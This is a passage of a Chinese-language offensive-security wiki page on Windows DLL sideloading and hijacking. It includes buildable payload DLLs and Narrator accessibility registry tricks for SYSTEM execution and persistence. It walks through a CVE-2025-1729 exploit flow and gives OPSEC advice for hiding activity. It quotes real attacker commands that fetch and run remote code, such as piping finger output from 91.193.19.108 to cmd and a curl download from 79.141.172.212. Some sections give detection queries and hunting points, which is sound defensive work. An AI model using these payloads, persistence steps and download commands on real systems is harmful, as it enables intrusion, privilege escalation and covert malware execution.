自包含的 **.NET NativeAOT 共享库**可用作植入的 native DLL，无需实现显式的 `DllMain`。使用 `[UnmanagedCallersOnly(EntryPoint = "...")]` 导出静态 C# 方法；当 native host 调用其中一个由编译器生成的入口点时，NativeAOT 会初始化模块，并在导出的 C# 方法体运行前执行 `[ModuleInitializer]` 方法。输出文件不需要单独安装 .NET runtime。<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL 仍需提供所选 host 实际调用的**导出名称和 ABI 兼容签名**。最简 stub 可能足以触发初始化，但缺少导出项可能导致加载失败，而签名不正确则可能破坏调用。枚举 host 的导入项，并使用 `dumpbin /exports payload.dll` 验证结果，然后再将输出文件重命名为 host 所需的依赖名称。<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>最简 NativeAOT 导出 DLL</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

将项目配置为独立的 Windows 原生共享库：<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

将重命名后的 DLL 放在复制来的易受攻击可执行文件旁边，并通过调用兼容导出的代码路径启动宿主程序。这种初始化器方法避免直接在 `DllMain` 中执行复杂操作，但 sideload 的前提条件不变：加载器必须按名称解析依赖项、选择应用程序目录，且不能先通过 KnownDLLs、已加载模块、SxS 重定向或受限的 `LOAD_LIBRARY_SEARCH_*` 标志满足该依赖项。<sup>[[26]](#references)[[30]](#references)</sup>

常规 native 模板请参见 [Windows C payloads](../windows-c-payloads.md)。sideload 的第一阶段之后可以执行 [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe)，但这是独立的注入技术，不属于 DLL 解析过程。

## 检测：DLL 伪装库加载

当加载的文件不是 Microsoft 签名，且其文件名与 Elastic 缓存的 Windows/系统 DLL 名称清单中的某个名称冲突时，Elastic Defend 9.5.0 会为库加载事件添加 `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"`。这将文件名清单、系统位置和签名分析移至端点传感器，因此核心 EQL 可简化为：<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

将此 enrichment 视为高价值 pivot，而非单独的证明。如果已签名的 host 从其自身的 **用户可写**目录加载 DLL，且该 DLL 未签名/不受信任，并且 `dll.Ext.relative_file_creation_time` 显示该 DLL 创建时间距加载时间很近，则应提高置信度。将排除项限定为确切的 publisher + host process + installation path；不要全局抑制发生名称冲突的 DLL，因为合法的安装程序和应用程序可能会携带名称类似系统 DLL 的私有库。<sup>[[26]](#references)</sup>

对于没有此 enrichment 的传感器，可通过关联发生名称冲突的 DLL、非系统加载路径、缺少/不受信任的 Microsoft 签名，以及较短的文件创建到加载间隔，来近似检测此行为。这需要维护 DLL 名称清单，并针对 `%SystemRoot%\\System32`、`SysWOW64`、`WinSxS` 和其他已批准的部署路径设置范围严格的排除项。<sup>[[26]](#references)</sup>

## 案例研究：Narrator OneCore TTS Localization DLL Hijack（辅助功能/AT）

Windows Narrator.exe 启动时仍会探测一个可预测的、特定语言的本地化 DLL，该 DLL 可被劫持以实现任意代码执行和持久化。<sup>[[7]](#references)</sup>

关键事实
- 探测路径（当前版本）：`%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll`（EN-US）。
- 旧路径（较旧版本）：`%windir%\System32\speech\engine\tts\msttslocenus.dll`。
- 如果 OneCore 路径下存在攻击者控制且可写的 DLL，它就会被加载，并执行 `DllMain(DLL_PROCESS_ATTACH)`。不需要任何导出函数。

使用 Procmon 进行发现
- 筛选条件：`Process Name is Narrator.exe` 和 `Operation is Load Image` 或 `CreateFile`。
- 启动 Narrator，并观察对上述路径的加载尝试。

最小 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC 静默
- 天真的 hijack 会发声/突出显示 UI。若要保持静默，在 attach 时枚举 Narrator 线程，打开主线程（`OpenThread(THREAD_SUSPEND_RESUME)`）并对其调用 `SuspendThread`；然后在你自己的线程中继续执行。完整代码请参见 PoC。<sup>[[8]](#references)</sup>

通过 Accessibility 配置触发并实现持久化
- 用户上下文（HKCU）：`reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM（HKLM）：`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 使用上述配置后，启动 Narrator 会加载植入的 DLL。在安全桌面（登录屏幕）上，按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在安全桌面上以 SYSTEM 身份执行。

通过 RDP 触发 SYSTEM 执行（横向移动）
- 允许经典 RDP 安全层：`reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 通过 RDP 连接到主机，在登录屏幕上按 CTRL+WIN+ENTER 启动 Narrator；你的 DLL 会在安全桌面上以 SYSTEM 身份执行。
- RDP 会话关闭时执行也会停止——请及时 inject/migrate。

自带 Accessibility（BYOA）
- 你可以克隆内置 Accessibility Tool（AT）的注册表项（例如 CursorIndicator），编辑它，使其指向任意二进制文件/DLL，然后导入该项，最后将 `configuration` 设置为该 AT 名称。这样就能通过 Accessibility framework 代理执行任意代码。

注意事项
- 在 `%windir%\System32` 下写入文件以及修改 HKLM 值需要管理员权限。
- 所有 payload 逻辑都可以放在 `DLL_PROCESS_ATTACH` 中；不需要 exports。

## 案例研究：CVE-2025-1729 - 使用 TPQMAssistant.exe 提权

本案例展示了 Lenovo TrackPoint Quick Menu（`TPQMAssistant.exe`）中的 **Phantom DLL Hijacking**，编号为 **CVE-2025-1729**。<sup>[[2]](#references)[[3]](#references)</sup>

### 漏洞详情

- **组件**：`TPQMAssistant.exe`，位于 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
- **计划任务**：`Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` 每天上午 9:30 在已登录用户的上下文中运行。
- **目录权限**：`CREATOR OWNER` 可写，因此本地用户可以放入任意文件。
- **DLL 搜索行为**：程序会优先尝试从其工作目录加载 `hostfxr.dll`；若文件缺失，则记录 "NAME NOT FOUND"，这表明本地目录具有更高的搜索优先级。

### Exploit 实现

攻击者可以在同一目录中放置恶意的 `hostfxr.dll` stub，利用缺失的 DLL 在用户上下文中实现代码执行：

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### 攻击流程

1. 以标准用户身份将 `hostfxr.dll` 放入 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待计划任务在上午 9:30 以当前用户的上下文运行。
3. 如果任务执行时有管理员登录，恶意 DLL 会在管理员的会话中以中等完整性运行。
4. 链接标准 UAC bypass 技术，从中等完整性提升到 SYSTEM 权限。

## 案例研究：MSI CustomAction Dropper + 通过签名 Host 进行 DLL side-loading（wsc_proxy.exe）

威胁行为者经常将基于 MSI 的 dropper 与 DLL side-loading 配合使用，在可信的签名进程下执行 payload。<sup>[[10]](#references)</sup>

链路概览
- 用户下载 MSI。GUI 安装期间，CustomAction 会静默运行（例如 LaunchApplication 或 VBScript action），并从嵌入资源中重建下一阶段。
- Dropper 将合法的签名 EXE 和恶意 DLL 写入同一目录（示例组合：Avast 签名的 wsc_proxy.exe + 攻击者控制的 wsc.dll）。
- 启动签名 EXE 时，Windows DLL 搜索顺序会优先从工作目录加载 wsc.dll，从而在签名父进程下执行攻击者代码（ATT&CK T1574.001）。

MSI 分析（检查要点）
- CustomAction 表：
  - 查找运行可执行文件或 VBScript 的条目。可疑模式示例：LaunchApplication 在后台执行嵌入文件。
  - 在 Orca（Microsoft Orca.exe）中检查 CustomAction、InstallExecuteSequence 和 Binary 表。
- MSI CAB 中嵌入或拆分的 payload：
  - 管理员提取：msiexec /a package.msi /qb TARGETDIR=C:\out
  - 或使用 lessmsi：lessmsi x package.msi C:\out
  - 查找多个小片段，这些片段由 VBScript CustomAction 拼接并解密。常见流程：

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

使用 wsc_proxy.exe 进行 Practical sideloading
- 将以下两个文件放在同一目录中：
  - wsc_proxy.exe：合法的签名宿主（Avast）。该进程会从其所在目录按名称尝试加载 wsc.dll。
  - wsc.dll：攻击者的 DLL。如果不需要特定导出函数，DllMain 即可满足要求；否则，构建一个代理 DLL，将所需导出函数转发给正版库，同时在 DllMain 中运行 payload。
- 构建一个最小化的 DLL payload：

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- 对于导出要求，使用代理框架（例如 DLLirant/Spartacus）生成一个转发 DLL，同时执行你的 payload。

- 此技术依赖宿主二进制文件解析 DLL 名称。如果宿主使用绝对路径或安全加载标志（例如 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories），劫持可能会失败。
- KnownDLLs、SxS 和转发导出都可能影响优先级，因此选择宿主二进制文件和导出集时必须考虑这些因素。

## 签名三件套 + 加密 payload（ShadowPad 案例分析）

Check Point 描述了 Ink Dragon 如何使用**三文件组合**部署 ShadowPad，在模仿合法软件的同时，让核心 payload 在磁盘上保持加密：<sup>[[12]](#references)</sup>

1. **已签名的宿主 EXE** – 滥用 AMD、Realtek 或 NVIDIA 等厂商的程序（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻击者会将可执行文件重命名为类似 Windows 二进制文件的名称（例如 `conhost.exe`），但 Authenticode 签名仍然有效。
2. **恶意 loader DLL** – 放置在 EXE 旁边，并使用预期的名称（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。该 DLL 通常是经过 ScatterBrain framework 混淆的 MFC 二进制文件；它唯一的任务是定位加密 blob、将其解密，然后以反射方式映射 ShadowPad。
3. **加密 payload blob** – 通常以 `<name>.tmp` 的形式存储在同一目录中。将解密后的 payload 映射到内存后，loader 会删除 TMP 文件以销毁取证证据。

Tradecraft 注意事项：

* 重命名已签名的 EXE（同时在 PE header 中保留原始 `OriginalFileName`），可以让它伪装成 Windows 二进制文件，同时保留厂商签名。因此，可以仿照 Ink Dragon 的做法，投放看起来像 `conhost.exe`、实际却是 AMD/NVIDIA 实用程序的二进制文件。
* 由于可执行文件仍受信任，大多数允许列表控制只要求恶意 DLL 与其放在一起。重点定制 loader DLL；通常无需改动已签名的父程序。
* ShadowPad 的解密器要求 TMP blob 与 loader 位于同一目录，并且该文件可写，以便在映射后将其清零。请在 payload 加载前保持目录可写；payload 进入内存后，可以安全删除 TMP 文件以满足 OPSEC 需求。

### LOLBAS stager + 分阶段 archive sideloading 链（finger → tar/curl → WMI）

Operator 会将 DLL sideloading 与 LOLBAS 结合使用，使磁盘上唯一的自定义 artifact 就是放在受信任 EXE 旁边的恶意 DLL：<sup>[[1]](#references)</sup>

- **远程命令 loader（Finger）：** 隐藏的 PowerShell 会启动 `cmd.exe /c`，从 Finger server 获取命令，再将其通过管道传给 `cmd`：

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` 获取 TCP/79 文本；`| cmd` 会执行服务器响应，方便操作人员在服务器端轮换 second stage。

- **内置下载/解压：** 使用无害扩展名下载归档文件，将其解压，并将 sideload 目标和 DLL 暂存到随机的 `%LocalAppData%` 文件夹下：

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` 会隐藏进度并跟随重定向；`tar -xf` 使用 Windows 内置的 tar。

- **WMI/CIM 启动：** 通过 WMI 启动 EXE，使其加载同目录下的 DLL 时，遥测数据会显示这是由 CIM 创建的进程：

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - 适用于倾向使用本地 DLL 的二进制文件（例如 `intelbq.exe`、`nearby_share.exe`）；payload（例如 Remcos）会以可信名称运行。

- **Hunting：**当 `forfiles` 同时出现 `/p`、`/m` 和 `/c` 时发出告警；这种组合在管理员脚本之外并不常见。


## 案例研究：NSIS dropper + Bitdefender Submission Wizard sideload（Chrysalis）

最近一次 Lotus Blossom 入侵滥用了可信更新链，投递了一个 NSIS-packed dropper，用于部署 DLL sideload 和完全驻留于内存中的 payload。<sup>[[13]](#references)</sup>

技术流程
- `update.exe`（NSIS）创建 `%AppData%\Bluetooth`，将其标记为 **HIDDEN**，放入一个改名后的 Bitdefender Submission Wizard `BluetoothService.exe`、恶意 `log.dll` 和加密 blob `BluetoothService`，然后启动该 EXE。
- 宿主 EXE 导入 `log.dll` 并调用 `LogInit`/`LogWrite`。`LogInit` 使用 mmap 加载 blob；`LogWrite` 使用自定义的基于 LCG 的流加密算法解密它（常量为 **0x19660D** / **0x3C6EF35F**，密钥材料由先前的哈希派生），用明文 shellcode 覆盖缓冲区、释放临时数据，然后跳转执行。
- 为避免使用 IAT，loader 使用 **FNV-1a basis 0x811C9DC5 + prime 0x1000193** 对导出名称进行哈希，再应用 Murmur 风格的 avalanche（**0x85EBCA6B**），并与加盐后的目标哈希进行比较。

主 shellcode（Chrysalis）
- 对类似 PE 的主模块进行解密：使用密钥 `gQ2JR&9;`，经过五轮重复的加法/XOR/减法操作，然后动态加载 `Kernel32.dll` → `GetProcAddress`，完成导入解析。
- 在运行时通过逐字符的位旋转/XOR 变换重建 DLL 名称字符串，然后加载 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32`。
- 使用第二个 resolver 遍历 **PEB → InMemoryOrderModuleList**，以 4 字节为单位解析每个导出表并进行 Murmur 风格的混合；只有找不到哈希时才回退到 `GetProcAddress`。

内嵌配置与 C2
- 配置位于投放的 `BluetoothService` 文件中，**偏移量 0x30808**（大小 **0x980**），使用密钥 `qwhvb^435h&*7` 通过 RC4 解密，从而获取 C2 URL 和 User-Agent。
- Beacon 会构建以点分隔的主机配置文件，添加前缀标签 `4Q`，然后使用密钥 `vAuig34%^325hGV` 通过 RC4 加密，再经 HTTPS 调用 `HttpSendRequestA`。响应会通过 RC4 解密，并由标签 switch 分派（`4T` shell、`4V` 进程执行、`4W/4X` 文件写入、`4Y` 读取/外传、`4\\` 卸载、`4` 驱动器/文件枚举 + 分块传输场景）。
- 执行模式由 CLI 参数控制：无参数 = 安装持久化（service/Run key），指向 `-i`；`-i` 使用 `-k` 重新启动自身；`-k` 跳过安装并运行 payload。

观察到的另一种 loader
- 同一次入侵还投放了 Tiny C Compiler，并从 `C:\ProgramData\USOShared\` 执行 `svchost.exe -nostdlib -run conf.c`，其旁边放有 `libtcc.dll`。攻击者提供的 C 源代码内嵌 shellcode，经过编译后直接在内存中运行，不会将 PE 写入磁盘。可按以下方式复现：

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- 这个基于 TCC 的编译并运行阶段在运行时导入了 `Wininet.dll`，并从硬编码的 URL 获取第二阶段 shellcode，形成了一个灵活的 loader，伪装成编译器运行。

## 使用 export proxying + host thread parking 的 signed-host sideloading

某些 DLL sideloading 链会加入**稳定性优化**，让合法 host 保持运行足够长的时间，以便后续阶段顺利加载，而不是在恶意 DLL 加载后崩溃。<sup>[[11]](#references)</sup>

观察到的模式
- 将可信 EXE 与恶意 DLL 放在一起，并使用预期的依赖项名称，例如 `version.dll`。
- 恶意 DLL 将**所有预期导出函数都代理**给真实的系统 DLL（例如 `%SystemRoot%\\System32\\version.dll`），使导入解析仍能成功，并让 host 进程继续工作。
- 加载后，恶意 DLL **修补 host 入口点**，使主线程陷入无限 `Sleep` 循环，而不是退出或执行会终止进程的代码路径。
- 新线程执行真正的恶意操作：解密下一阶段 DLL 的名称或路径（常见方式有 RC4/XOR），然后使用 `LoadLibrary` 启动它。

为何重要
- 常规 DLL proxying 可以保持 API 兼容性，但不能保证 host 能存活足够长的时间来加载后续阶段。
- 将主线程停放在 `Sleep(INFINITE)` 中，是在 loader 通过工作线程执行解密、分阶段加载或网络引导时，让签名进程保持驻留的一种简单方法。
- 如果只查找可疑的 `DllMain`，而实际行为发生在 host 入口点被修补、辅助线程启动之后，就会漏掉这种模式。

最简工作流程
1. 复制签名 host EXE，并确定它从本地目录解析的 DLL。
2. 构建一个导出相同函数并将其转发给合法 DLL 的 proxy DLL。
3. 在 `DllMain(DLL_PROCESS_ATTACH)` 中创建一个工作线程。
4. 在线程中修补 host 入口点或主线程的起始例程，使其循环调用 `Sleep`。
5. 解密下一阶段 DLL 的名称/配置，并调用 `LoadLibrary` 或对 payload 进行 manual-map。

防御排查重点
- 签名进程从自身应用程序目录而非 `System32` 加载 `version.dll` 或类似常见库的情况。
- 映像加载后不久，进程入口点处出现内存补丁，尤其是跳转/调用被重定向到 `Sleep`/`SleepEx` 的情况。
- proxy DLL 创建的线程立即对名称经过解密的第二个 DLL 调用 `LoadLibrary` 的情况。
- 与厂商可执行文件放在一起、位于可写暂存目录（如 `ProgramData`、`%TEMP%` 或解压后的归档路径）中的完整导出 proxy DLL。

## References

- [1] [Red Canary – Intelligence Insights：2026 年 1 月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - 使用 TPQMAssistant.exe 进行权限提升](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT：DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows 中的 DLL hijacking：简单的 C 示例](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore 部署针对欧洲的新型 malware](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility：当 DLL Hijacks 遇上 Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – 数字分身：分发 Gh0st RAT 的不断演变的冒充活动剖析](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – 利益交汇：针对东南亚某政府的威胁集群分析](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – 深入 Ink Dragon：揭示隐蔽攻击行动的中继网络与内部运作机制](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor：深入剖析 Lotus Blossom 的工具集](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack 链](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – 追踪伊朗 APT Screening Serpens 的 2026 年间谍活动](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` 元素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` 元素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` 元素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` 元素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` 元素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` 元素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – 迅猛出击：伊朗冲突期间的 Nimbus Manticore 行动](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – 任务操作](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 瞄准东南亚政府和关键基础设施](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – 使用 Elastic Defend 9.5.0 重建并检测 Windows DLL 搜索顺序劫持](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – 使用 Native AOT 构建本机库](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – 使用 Native AOT 导出本机函数](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – 动态链接库搜索顺序](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – PE 格式](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – 揭露嵌入合法软件中的 SectopRAT 变种](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – 窃取 LIGHTSHOW（第一部分）](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operation FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
